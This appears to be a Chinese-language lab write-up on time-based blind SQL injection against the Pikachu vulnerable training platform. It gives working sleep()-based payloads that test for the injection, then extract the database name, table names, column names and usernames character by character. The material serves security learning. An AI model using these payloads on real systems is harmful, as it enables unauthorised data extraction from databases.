---
title: Pikachu 时间盲注writeup
date: 2026-10-30
category: Web安全
tags: [SQL注入, 时间盲注, sleep延时注入, Pikachu]
---
## 一、实验环境

靶场：Pikachu漏洞平台
页面：127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php
注入类型：字符型时间盲注

## 二、漏洞特点

✅ 和布尔盲注最大区别：
这个页面不管输入正确还是错误，页面都完全一样，没有yes、no区分！
没法靠页面内容判断真假。
我们利用 sleep() 函数：

• 如果条件为真 → 数据库执行sleep，页面卡住、延迟几秒才加载出来

• 如果条件为假 → 不sleep，页面立刻加载完成
靠页面响应快慢来判断语句是否成立，叫做时间盲注。

底层SQL：
SELECT username FROM user WHERE username='$name';
闭合：'，注释：#

## 三、测试注入是否存在

输入payload：
' and sleep(5) #
拼接之后SQL：
SELECT username FROM user WHERE username='' and sleep(5) #';
👉 现象：页面延迟5秒才加载出来，说明注入成功！
如果没有延迟，说明没执行sleep，注入失败。
原理：and 前面条件成立，才会执行后面sleep(5)，让数据库休眠5秒。
## 四、核心函数

1. sleep(N)：休眠N秒，制造延时

2. if(条件,成立执行A,不成立执行B) 条件判断函数（时间盲注最常用）
if(条件,sleep(5),1)：条件真就sleep5秒，条件假直接返回1，不延时

3. length()：获取字符串长度

4. substr()：截取字符

5. ascii()：转ascii码

## 五、注入步骤

1. 判断数据库名长度

payload：
' and if(length(database())=7,sleep(5),1) #
解释：
如果数据库名字长度等于7 → 休眠5秒，页面转圈很久
如果不等于7 → 不延时，页面马上出来
pikachu长度是7，提交后页面会延迟5秒加载。

2. 猜数据库第一个字符
' and if(ascii(substr(database(),1,1))=112,sleep(5),1) #
含义：
如果库名第1位ascii码等于112（字母p），就sleep5秒。
页面延迟 → 条件成立，第一位是p。
依次修改substr第二个参数，substr(...,2,1) 猜第二位，以此类推。
3. 猜表名（第一个表）
' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=109,sleep(5),1) #
4. 猜member字段
' and if(ascii(substr((select column_name from information_schema.columns where table_name='member' limit 0,1),1,1))=105,sleep(5),1) #
5. 猜数据（用户名）
' and if(ascii(substr((select username from member limit 0,1),1,1))=118,sleep(5),1) #

